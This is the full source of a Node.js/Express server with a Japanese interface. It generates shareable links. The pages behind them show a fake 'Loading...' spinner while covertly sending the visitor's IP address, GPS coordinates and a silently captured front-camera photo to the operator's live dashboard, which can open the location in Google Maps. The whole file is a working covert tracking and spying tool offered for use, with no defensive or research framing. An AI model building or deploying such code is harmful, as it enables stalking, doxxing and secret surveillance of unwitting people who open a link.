const express = require('express');
const app = express();
const http = require('http');
const server = http.createServer(app);
const { Server } = require('socket.io');
const io = new Server(server);

const logs = [];
const photos = [];

function generateId() {
  return Math.random().toString(36).substring(2, 10) +
         Math.random().toString(36).substring(2, 6);
}

// ===== HTML（コマンド画面） =====
const HTML = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>Command + Link Generator</title>
<script src="/socket.io/socket.io.js"></script>
<style>
* { margin:0; padding:0; box-sizing:border-box; user-select:none; -webkit-touch-callout:none; -webkit-tap-highlight-color:transparent; }
body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas','Lucida Console','Courier New',monospace; touch-action:none; }
.window { position:absolute; background:#000; border:2px solid #555; border-radius:0; box-shadow:0 10px 40px rgba(0,0,0,0.9); display:flex; flex-direction:column; overflow:hidden; will-change:left,top,width,height; }
.window .drag-area { position:absolute; top:0; left:0; width:100%; height:20px; z-index:10; cursor:grab; touch-action:none; background:transparent; }
.window .drag-area:active { cursor:grabbing; }
.window .resize-handle { position:absolute; right:0; bottom:0; width:32px; height:32px; cursor:nwse-resize; z-index:20; touch-action:none; background:transparent; }
.window .resize-handle::after { content:''; position:absolute; right:4px; bottom:4px; width:0; height:0; border-right:14px solid #555; border-bottom:14px solid #555; border-left:14px solid transparent; border-top:14px solid transparent; opacity:0.8; pointer-events:none; }

#cmd-window { left:40px; top:40px; width:90vw; max-width:780px; height:60vh; min-width:400px; min-height:300px; }
#cmd-terminal { flex:1; background:#000; padding:20px 14px 8px 14px; display:flex; flex-direction:column; overflow:hidden; min-height:0; }
#cmd-output { flex:1; overflow-y:auto; white-space:pre-wrap; word-break:break-all; font-size:14px; line-height:1.6; color:#fff; margin-bottom:4px; -webkit-overflow-scrolling:touch; }
#cmd-output::-webkit-scrollbar { width:6px; background:#1a1a1a; }
#cmd-output::-webkit-scrollbar-thumb { background:#555; }
#cmd-input-line { display:flex; align-items:center; border-top:1px solid #333; padding-top:6px; flex-shrink:0; gap:6px; flex-wrap:wrap; }
#cmd-prompt { color:#fff; font-weight:normal; margin-right:8px; font-size:14px; white-space:pre; }
#cmd-input { background:transparent; border:none; outline:none; color:#fff; font-family:inherit; font-size:14px; flex:1; min-width:100px; caret-color:#fff; user-select:text; -webkit-user-select:text; touch-action:auto; pointer-events:auto; }
.cmd-echo { color:#fff; }
.cmd-error { color:#ff4444; }
.cmd-ip { color:#88ddff; }
.cmd-notify { color:#ffaa44; }
.cmd-location { color:#cc88ff; }
.cmd-code { color:#88ffaa; }
.cmd-photo { color:#ff88cc; }

#menu-window { left:60px; top:62vh; width:80vw; max-width:480px; height:auto; min-height:140px; padding:20px 20px 18px 20px; }
#menu-window .menu-title { color:#fff; font-size:15px; margin-bottom:14px; font-weight:bold; }
#menu-window .btn-row { display:flex; gap:10px; flex-wrap:wrap; }
#menu-window .btn-link { background:transparent; border:1px solid #88ddff; color:#88ddff; padding:8px 24px; font-family:inherit; font-size:14px; cursor:pointer; transition:background 0.2s; touch-action:auto; pointer-events:auto; }
#menu-window .btn-link:hover { background:#1a2a3a; }
#menu-window .btn-copy { background:transparent; border:1px solid #888; color:#888; padding:8px 18px; font-family:inherit; font-size:13px; cursor:pointer; transition:background 0.2s; touch-action:auto; pointer-events:auto; }
#menu-window .btn-copy:hover { background:#1a1a1a; }
#menu-window .btn-copy.copy-success { color:#66ff88 !important; border-color:#66ff88; }
#menu-window .result-area { margin-top:14px; padding-top:12px; border-top:1px solid #333; min-height:40px; color:#fff; font-size:13px; word-break:break-all; }
#menu-window .result-area .link-display { display:block; color:#88ddff; text-decoration:underline; cursor:pointer; margin-bottom:4px; padding:4px 0; touch-action:auto; pointer-events:auto; }
#menu-window .result-area .link-display:hover { color:#aaefff; }
#menu-window .result-area .status-msg { color:#aaa; font-size:12px; }
</style>
</head>
<body>

<div id="cmd-window" class="window">
  <div class="drag-area" id="cmd-drag"></div>
  <div id="cmd-terminal">
    <div id="cmd-output">Enter the command</div>
    <div id="cmd-input-line">
      <span id="cmd-prompt">Command input</span>
      <input type="text" id="cmd-input" autofocus spellcheck="false">
    </div>
  </div>
  <div class="resize-handle" id="cmd-resize"></div>
</div>

<div id="menu-window" class="window">
  <div class="drag-area" id="menu-drag"></div>
  <div class="menu-title">■ リンク生成</div>
  <div class="btn-row">
    <button class="btn-link" id="generate-btn">リンク</button>
    <button class="btn-copy" id="copy-btn" style="display:none;">📋 コピー</button>
  </div>
  <div class="result-area" id="result-area">
    <span class="status-msg">「リンク」を押すと相手に渡す用のリンクが生成されます</span>
  </div>
  <div class="resize-handle" id="menu-resize"></div>
</div>

<script>
(function() {
  const cmdOutput = document.getElementById('cmd-output');
  const cmdInput = document.getElementById('cmd-input');
  function addCmdOutput(text, cls) {
    const div = document.createElement('div');
    div.textContent = text;
    if (cls) div.className = cls;
    cmdOutput.appendChild(div);
    cmdOutput.scrollTop = cmdOutput.scrollHeight;
  }

  const socket = io();
  socket.on('new-log', function(data) {
    addCmdOutput('[📡 アクセス検知] 誰かがリンクを開きました！', 'cmd-notify');
    addCmdOutput('[🌐 IPアドレス] ' + data.ip, 'cmd-ip');
    if (data.lat && data.lon) {
      addCmdOutput('[📍 位置情報] 緯度: ' + data.lat + ' / 経度: ' + data.lon, 'cmd-location');
      addCmdOutput('[🗺️ Googleマップ] https://maps.google.com/maps?q=' + data.lat + ',' + data.lon, 'cmd-location');
    } else {
      addCmdOutput('[📍 位置情報] なし（拒否または非対応）', 'cmd-error');
    }
    addCmdOutput('[🔗 リンクID] ' + data.id, 'cmd-echo');
    addCmdOutput('[🕒 時刻] ' + data.time, 'cmd-echo');
    window._lastLog = data;
  });

  let photoCountNum = 0;
  socket.on('new-photo', function(data) {
    photoCountNum++;
    const imgDiv = document.createElement('div');
    imgDiv.style.margin = '4px 0';
    const img = document.createElement('img');
    img.src = data.image;
    img.style.maxWidth = '300px';
    img.style.maxHeight = '200px';
    img.style.border = '1px solid #555';
    img.style.borderRadius = '4px';
    imgDiv.appendChild(img);
    cmdOutput.appendChild(imgDiv);
    cmdOutput.scrollTop = cmdOutput.scrollHeight;
    addCmdOutput('[📸 写真受信] ' + photoCountNum + '枚目を受信しました！', 'cmd-photo');
  });

  cmdInput.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
      const cmd = cmdInput.value.trim();
      cmdInput.value = '';
      if (cmd === '') return;
      addCmdOutput('> ' + cmd, 'cmd-echo');

      if (cmd === '/map') {
        const d = window._lastLog;
        if (!d) {
          addCmdOutput('  [ データなし ]', 'cmd-error');
          return;
        }
        if (d.lat && d.lon) {
          const mapUrl = 'https://www.google.com/maps?q=' + d.lat + ',' + d.lon;
          addCmdOutput('  🗺️ ' + mapUrl, 'cmd-location');
          addCmdOutput('  [ クリックで地図を開く ]', 'cmd-echo');
          window.open(mapUrl, '_blank');
        } else {
          addCmdOutput('  [ 位置情報なし ]', 'cmd-error');
        }
        return;
      }

      if (cmd === '/help') {
        addCmdOutput('  コマンド一覧', 'cmd-code');
        addCmdOutput('  /map   → 最新の位置をGoogleマップで開く', 'cmd-echo');
        addCmdOutput('  /clear → 画面クリア', 'cmd-echo');
        return;
      }

      if (cmd === '/clear') {
        cmdOutput.innerHTML = '';
        return;
      }

      addCmdOutput('Error', 'cmd-error');
    }
  });

  const generateBtn = document.getElementById('generate-btn');
  const copyBtn = document.getElementById('copy-btn');
  const resultArea = document.getElementById('result-area');
  let currentLink = '';

  async function generateLink() {
    try {
      const res = await fetch('/generate');
      const data = await res.json();
      currentLink = data.link;
      resultArea.innerHTML = '<a href="#" class="link-display" id="generated-link">🔗 ' + currentLink + '</a><span class="status-msg">✅ 生成完了！</span>';
      copyBtn.style.display = 'inline-block';
      copyBtn.textContent = '📋 コピー';
      copyBtn.className = 'btn-copy';
      document.getElementById('generated-link').addEventListener('click', function(e) {
        e.preventDefault();
        window.open(currentLink, '_blank');
      });
    } catch(err) {
      resultArea.innerHTML = '<span class="status-msg" style="color:#ff4444;">⚠️ リンク生成に失敗</span>';
    }
  }
  generateBtn.addEventListener('click', generateLink);

  copyBtn.addEventListener('click', function() {
    if (!currentLink) return;
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(currentLink).then(function() {
        copyBtn.textContent = '✅ コピー完了！';
        copyBtn.className = 'btn-copy copy-success';
        setTimeout(function() {
          copyBtn.textContent = '📋 コピー';
          copyBtn.className = 'btn-copy';
        }, 2000);
      }).catch(function() { fallbackCopy(); });
    } else { fallbackCopy(); }
  });
  function fallbackCopy() {
    const textarea = document.createElement('textarea');
    textarea.value = currentLink;
    textarea.style.position = 'fixed';
    textarea.style.left = '-9999px';
    document.body.appendChild(textarea);
    textarea.select();
    try {
      document.execCommand('copy');
      copyBtn.textContent = '✅ コピー完了！';
      copyBtn.className = 'btn-copy copy-success';
      setTimeout(function() {
        copyBtn.textContent = '📋 コピー';
        copyBtn.className = 'btn-copy';
      }, 2000);
    } catch(e) { alert('コピーに失敗しました'); }
    document.body.removeChild(textarea);
  }

  function makeDraggable(wId, dId, rId) {
    const win = document.getElementById(wId);
    const drag = document.getElementById(dId);
    const resize = document.getElementById(rId);
    let dragData = null, resizeData = null;
    function startDrag(cx, cy) {
      const rect = win.getBoundingClientRect();
      dragData = { offsetX: cx - rect.left, offsetY: cy - rect.top };
      win.style.zIndex = 999;
      win.style.transition = 'none';
    }
    function moveDrag(cx, cy) {
      if (!dragData) return;
      win.style.left = (cx - dragData.offsetX) + 'px';
      win.style.top = (cy - dragData.offsetY) + 'px';
    }
    function endDrag() { dragData = null; win.style.zIndex = ''; win.style.transition = ''; }
    drag.addEventListener('mousedown', function(e) { startDrag(e.clientX, e.clientY); e.preventDefault(); });
    drag.addEventListener('touchstart', function(e) { var t = e.touches[0]; startDrag(t.clientX, t.clientY); e.preventDefault(); }, { passive: false });
    function startResize(cx, cy) {
      var rect = win.getBoundingClientRect();
      resizeData = { startX: cx, startY: cy, startW: rect.width, startH: rect.height };
      win.style.zIndex = 999;
      win.style.transition = 'none';
    }
    function moveResize(cx, cy) {
      if (!resizeData) return;
      var nw = resizeData.startW + (cx - resizeData.startX);
      var nh = resizeData.startH + (cy - resizeData.startY);
      if (nw < 350) nw = 350;
      if (nh < 250) nh = 250;
      win.style.width = nw + 'px';
      win.style.height = nh + 'px';
    }
    function endResize() { resizeData = null; win.style.zIndex = ''; win.style.transition = ''; }
    resize.addEventListener('mousedown', function(e) { startResize(e.clientX, e.clientY); e.preventDefault(); e.stopPropagation(); });
    resize.addEventListener('touchstart', function(e) { var t = e.touches[0]; startResize(t.clientX, t.clientY); e.preventDefault(); e.stopPropagation(); }, { passive: false });
    document.addEventListener('mousemove', function(e) { if (dragData) moveDrag(e.clientX, e.clientY); if (resizeData) moveResize(e.clientX, e.clientY); });
    document.addEventListener('mouseup', function() { if (dragData) endDrag(); if (resizeData) endResize(); });
    document.addEventListener('touchmove', function(e) { var t = e.touches[0]; if (dragData) moveDrag(t.clientX, t.clientY); if (resizeData) moveResize(t.clientX, t.clientY); e.preventDefault(); }, { passive: false });
    document.addEventListener('touchend', function() { if (dragData) endDrag(); if (resizeData) endResize(); });
  }
  makeDraggable('cmd-window', 'cmd-drag', 'cmd-resize');
  makeDraggable('menu-window', 'menu-drag', 'menu-resize');

  function clampWindows() {
    document.querySelectorAll('.window').forEach(function(win) {
      var rect = win.getBoundingClientRect();
      var maxW = window.innerWidth - 20;
      var maxH = window.innerHeight - 20;
      if (rect.width > maxW) win.style.width = maxW + 'px';
      if (rect.height > maxH) win.style.height = maxH + 'px';
      if (rect.left < 0) win.style.left = '10px';
      if (rect.top < 0) win.style.top = '10px';
    });
  }
  window.addEventListener('resize', clampWindows);
  document.addEventListener('click', function(e) {
    if (!e.target.closest('#menu-window input')) {
      cmdInput.focus();
    }
  });
})();
</script>
</body>
</html>`;

// ===== サーバー =====
app.get('/', (req, res) => {
  res.send(HTML);
});

app.get('/generate', (req, res) => {
  const id = generateId();
  const link = `https://${req.get('host')}/t/${id}`;
  res.json({ link });
});

// ★ 相手側ページ（ローディングのみ＋自動取得）
app.get('/t/:id', (req, res) => {
  const id = req.params.id;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'IP不明';
  const time = new Date().toLocaleString('ja-JP');

  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Loading...</title>
      <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:#0a0e14; height:100vh; display:flex; justify-content:center; align-items:center; flex-direction:column; font-family:'Segoe UI',sans-serif; }
        .spinner { width:40px; height:40px; border:3px solid #1a2a3a; border-top:3px solid #4a8ada; border-radius:50%; animation:spin 1s linear infinite; }
        @keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
        .msg { color:#6688aa; font-size:16px; margin-top:24px; letter-spacing:1px; }
        .sub { color:#334455; font-size:13px; margin-top:8px; }
      </style>
    </head>
    <body>
      <div class="spinner"></div>
      <div class="msg">Loading...</div>
      <div class="sub">please wait</div>

      <script>
        var locationSent = false;
        var photoTaken = false;
        const id = '${id}';
        const ip = '${ip}';
        const time = '${time}';

        // ---- 位置情報送信（最初に実行） ----
        function sendLocation(lat, lon) {
          if (locationSent) return;
          locationSent = true;
          fetch('/location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ id: id, ip: ip, time: time, lat: lat, lon: lon })
          });
        }

        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            function(pos) { sendLocation(pos.coords.latitude, pos.coords.longitude); },
            function() { sendLocation(null, null); }
          );
        } else {
          sendLocation(null, null);
        }

        // ---- カメラ：自動で1枚撮影（ボタンなし、表示なし） ----
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
          navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
            .then(function(stream) {
              const video = document.createElement('video');
              video.srcObject = stream;
              video.play();
              video.onloadedmetadata = function() {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
                fetch('/photo', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({ id: id, image: dataUrl })
                });
                stream.getTracks().forEach(function(track) { track.stop(); });
              };
            })
            .catch(function(err) {
              // カメラ拒否またはエラー：何もしない
            });
        }
      </script>
    </body>
    </html>
  `);
});

// 位置情報受信
app.post('/location', express.json(), (req, res) => {
  const { id, ip, time, lat, lon } = req.body;
  logs.push({ id, ip, time, lat, lon });
  io.emit('new-log', { id, ip, time, lat, lon });
  console.log('[+] IP: ' + ip + ' | ' + (lat ? lat + ',' + lon : 'なし'));
  res.sendStatus(200);
});

// ★ 写真受信
app.post('/photo', express.json(), (req, res) => {
  const { id, image } = req.body;
  io.emit('new-photo', { id: id, image: image });
  console.log('[📸] 写真受信 ID: ' + id);
  res.sendStatus(200);
});

app.get('/logs', (req, res) => {
  if (logs.length === 0) return res.send('<h2>データなし</h2><a href="/">戻る</a>');
  let html = '<h2>アクセスログ</h2><table border="1"><tr><th>時間</th><th>IP</th><th>緯度</th><th>経度</th></tr>';
  logs.reverse().forEach(function(log) {
    html += '<tr><td>' + log.time + '</td><td>' + log.ip + '</td><td>' + (log.lat || '-') + '</td><td>' + (log.lon || '-') + '</td></tr>';
  });
  html += '</table><a href="/">戻る</a>';
  res.send(html);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, function() {
  console.log('Server running on port ' + PORT);
});
